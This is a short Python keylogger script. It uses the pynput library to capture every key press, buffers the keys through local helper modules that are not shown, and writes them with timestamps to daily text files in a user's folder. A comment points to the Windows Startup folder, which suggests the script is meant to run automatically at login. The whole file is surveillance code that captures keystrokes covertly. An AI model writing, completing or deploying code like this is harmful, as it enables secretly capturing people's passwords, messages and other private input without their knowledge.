import logging, threading, time
from pynput.keyboard import Key, Listener
from thread import Thread
from input import Input

#shell:startup
DIR_PATH = "C:/Users/andrew/logs/"
LOG_PATH = DIR_PATH + time.strftime("%d-%b-%Y") + ".txt"
LOG_FORMAT = time.strftime("%a, %d %b %Y %H:%M:%S") + ': %(message)s'
logging.basicConfig(filename=LOG_PATH, level=logging.DEBUG, format=LOG_FORMAT)

# Initialize global vars
thread = None
input = Input()

"""
Log Text
"""
def logText():

  # Get global input var
  global input

  # Start logging
  logging.info(input.getText())
  input.clear()

"""
Press key event
"""
def on_press(key):

  # Get global vars
  global thread, input

  # Handles on_press
  if input.press(str(key)):

    if thread is None or thread.is_alive() is False:
      thread = Thread(callback=logText)
      thread.start()
    else:
      thread.resetInterval()

with Listener(on_press=on_press) as listener:
  listener.join()
